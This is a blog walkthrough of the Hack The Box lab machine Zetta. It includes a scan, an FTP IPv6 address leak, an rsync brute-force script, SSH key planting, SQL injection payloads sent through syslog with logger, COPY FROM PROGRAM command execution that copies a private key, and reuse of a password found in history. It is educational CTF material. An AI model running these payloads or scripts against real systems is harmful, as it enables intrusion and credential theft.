---
layout: post
title: "Zetta: Hack The Box Walkthrough"
date: 2020-02-23 01:52:00 +0000
last_modified_at: 2020-02-23 01:52:00 +0000
category: Walkthrough
tags: ["Hack The Box", Zetta, retired, Linux, Hard]
comments: true
image:
  feature: zetta-htb-walkthrough.jpg
  credit: geralt / Pixabay
  creditlink: https://pixabay.com/illustrations/universe-sky-star-space-cosmos-2742113/
---

This post documents the complete walkthrough of Zetta, a retired vulnerable [VM][1] created by [jkr][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Zetta is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.156 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-01 14:10:56 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 21/tcp on 10.10.10.156                                    
Discovered open port 22/tcp on 10.10.10.156                                    
Discovered open port 80/tcp on 10.10.10.156
```

Nothing unusual with these ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p21,22,80 -A --reason -oN nmap.txt 10.10.10.156
...
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 Pure-FTPd
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey:
|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA)
|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA)
|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519)
80/tcp open  http    syn-ack ttl 63 nginx
| http-methods:
|_  Supported Methods: HEAD
|_http-title: Ze::a Share
```

Seems pretty water-tight to me. Notice that only the HEAD method is allowed? Something for us keep in mind maybe? Anyways, here's how the site looks like.


{% include image.html image_alt="19de6bf3.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/19de6bf3.png" %}


Other than the little JavaScript that generates a 32-character random string for both username and password to the FTP, there's nothing interesting to explore.

### RFC 2428: FTP Extensions for IPv6 and NATs

Upon connection to the FTP, I was greeted with the following message.


{% include image.html image_alt="af6bf114.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/af6bf114.png" %}


There was also a mention of FXP and RFC 2428 in one of service catalog.


{% include image.html image_alt="548509c8.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/548509c8.png" %}


We can use the EPRT command to expose it's IPv6 address. The EPRT command specifies an extended address for the data connection. We can simply use `ncat` to listen for incoming IPv6 connections to capture the server's real IPv6 address. This is the IPv6 address of my HTB VPN interface.


{% include image.html image_alt="a1041613.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/a1041613.png" %}


The server's IPv6 address must also start with `dead:beef`. :wink:

Specify `2` (IPv6) as the address family and my IPv6 address as the extended address, and finally the port number I'm listening at (`1234`).

***Sending raw FTP commands to the server***


{% include image.html image_alt="c9c0171f.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/c9c0171f.png" %}


***IPv6 address captured!***


{% include image.html image_alt="b33566c9.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/b33566c9.png" %}


The IPv6 address of the server is `dead:beef::250:56ff:feb9:33e`.

### IPv6-only Service

Armed with the IPv6 address of the server, we can run another `nmap` scan, this time only for IPv6 services.

```
# nmap -6 -n -v -Pn -p- -A --reason -oN nmap6.txt dead:beef::250:56ff:feb9:33e
...
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 Pure-FTPd
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey:
|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA)
|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA)
|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519)
80/tcp   open  http    syn-ack ttl 63 nginx
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Ze::a Share
8730/tcp open  rsync   syn-ack ttl 63 (protocol version 31)                                      
```

Interesting. There's `rsyncd` listening at `8730/tcp`.

### `rsync` It to Me Baby

Time to check it out.


{% include image.html image_alt="230da2f4.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/230da2f4.png" %}


Notice that it has almost all the modules corresponding to various directories, except for `etc`? Let's see what happens.


{% include image.html image_alt="a2710b7a.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/a2710b7a.png" %}


Jackpot! As usual, let's grab a copy of `/etc/passwd`.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
roy:x:1000:1000:roy,,,:/home/roy:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin
postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

OK. We have only one user, `roy`. With that in mind, let's check out `rsyncd.conf` to see what other goodies we can find.

```
# Syncable home directory for .dot file sync for me.
# NOTE: Need to get this into GitHub repository and use git for sync.
[home_roy]
        path = /home/roy
        read only = no
        # Authenticate user for security reasons.
        uid = roy
        gid = roy
        auth users = roy
        secrets file = /etc/rsyncd.secrets
        # Hide home module so that no one tries to access it.
        list = false
```

Bam. Another hidden `rsync` module. Looks like authentication is required. Towards that end, I wrote a simple `bash` script, using `rsync` as the main driver to brute-force the password. Combined the script with GNU Parallel, you get a multi-threaded brute-forcer of sorts. :wink:

<div class="filename"><span>brute.sh</span></div>

```bash
#!/bin/bash

HOST="dead:beef::250:56ff:feb9:a4c5"
PORT=8730
USER=roy
MOD="home_roy"
PASS=$1
TEMP=$(mktemp -u)

echo -n "$PASS" > $TEMP; chmod 600 $TEMP

function die() {
  killall perl &>/dev/null
}

if rsync -6 --password-file=$TEMP rsync://$USER@[$HOST]:$PORT/$MOD &>/dev/null; then
  echo "[*] Password: $PASS"
  echo "$PASS" > pwd; chmod 600 pwd
  die
fi

# clean up
rm -rf $TEMP
```

Let's give it a shot.


{% include image.html image_alt="0808d74f.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/0808d74f.png" %}


Of course! `computer` sounds like a password that Roy would use.


{% include image.html image_alt="645a988c.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/645a988c.png" %}


Woohoo. The `user.txt` is here.


{% include image.html image_alt="f87f665f.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/f87f665f.png" %}


## Low-Privilege Shell

Let's see if we can copy a RSA public key we control to `/home/roy/.ssh/authorized_keys`.

```
# rsync -6 --password-file=pwd authorized_keys rsync://roy@[dead:beef::250:56ff:feb9:33e]:8730/home_roy/.ssh/
```


{% include image.html image_alt="03d50abd.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/03d50abd.png" %}


Perfect.

## Privilege Escalation

During enumeration of roy's account, I noticed a number of `TuDu` entries, particularly one that purportedly writes syslog entries to PostgreSQL database instead.


{% include image.html image_alt="2304da64.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/2304da64.png" %}


And another one that talks about password security.


{% include image.html image_alt="a7f1055a.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/a7f1055a.png" %}


On top of that, there are a number of `.git` local repositories as well.


{% include image.html image_alt="e06c61a6.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/e06c61a6.png" %}


There was something interesting with the `rsyslog` commits.


{% include image.html image_alt="e2b95ae1.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/e2b95ae1.png" %}


The latest commit talks about adding/adapting template from the manual. If the commit message is to be trusted, then SQL injection might be possible. Also, notice that `option.sql="on"` is set? According to the [documention](https://www.rsyslog.com/doc/master/configuration/templates.html#options),


{% include image.html image_alt="0e7cdad4.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/0e7cdad4.png" %}


### PostgreSQL Dollar-Quoting

_"PostgreSQL has a feature called [dollar-quoting](https://www.postgresql.org/docs/current/static/plpgsql-development-tips.html#PLPGSQL-QUOTE-TIPS), which allows you to include a body of text without escaping the single quotes."_ Exactly what we need! To send syslog messages, we need `logger` as well.

### SQL Injection through Syslog


{% include image.html image_alt="8781dc2a.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/8781dc2a.png" %}


Looking at the template SQL statement, it's possible to inject SQL statements, through the `syslog` message field, `%msg%`.

```
INSERT INTO syslog_lines (message, devicereportedtime) values ('%msg%', '%timereported%')
```

Let's try this.

```
$ logger -s -p local7.info "', now()); DROP TABLE IF EXISTS moss; CREATE TABLE moss(t TEXT); INSERT INTO moss(t) VALUES (\$\$hello\$\$); COPY moss(t) TO \$here\$/tmp/moss\$here\$; -- -"
```


{% include image.html image_alt="6ad1dc12.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/6ad1dc12.png" %}


Awesome. It works!

### CVE-2019-9193 - It's NOT a Security Vulnerability

>  In PostgreSQL 9.3 through 11.2, the "COPY TO/FROM PROGRAM" function allows superusers and users in the 'pg_execute_server_program' group to execute arbitrary code in the context of the database's operating system user.

Armed with the previous insight, we can probably make use of [CVE-2019-9193](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9193) to execute commands. Let's see if this version is "vulnerable". :laughing:

```
$ logger -s -p local7.info "', now()); DROP TABLE IF EXISTS cmd; CREATE TABLE cmd(out TEXT); COPY cmd FROM PROGRAM \$cmd\$rm /tmp/moss\$cmd\$; --"
```


{% include image.html image_alt="8133b35a.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/8133b35a.png" %}


Bam. Long story short, this `postgres` account left the SSH private key in the home directory `/var/lib/postgresql`. Let's copy the key to `/tmp` for easy access.

```
$ logger -s -p local7.info "', now()); DROP TABLE IF EXISTS cmd; CREATE TABLE cmd(out TEXT); COPY cmd FROM PROGRAM \$cmd\$cp /var/lib/postgresql/.ssh/id_rsa /tmp/sshh; chmod 666 /tmp/sshh\$cmd\$; --"
```


{% include image.html image_alt="7c864680.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/7c864680.png" %}


## Final Privilege Escalation

Armed with the SSH private key of `postgres`, I can simply log in to the account through SSH.


{% include image.html image_alt="227bc178.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/227bc178.png" %}


During enumeration of the postgres account, I notice its password lying around in the `.psql_history`.

```
$ cat .psql_history
CREATE DATABASE syslog;
\c syslog
CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);
\d syslog_lines
ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
```

Recall the `TuDu` entry about the password scheme? Could this be `root`'s password as well?


{% include image.html image_alt="d133640c.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/d133640c.png" %}


Indeed. The password is `sup3rs3cur3p4ass@root`! Well, with that, getting `root.txt` is easy.


{% include image.html image_alt="1538975e.png" image_src="/a2612680-aa5d-4086-b8ce-a46808e10511/1538975e.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/204
[2]: https://www.hackthebox.eu/home/users/profile/77141
[3]: https://www.hackthebox.eu/
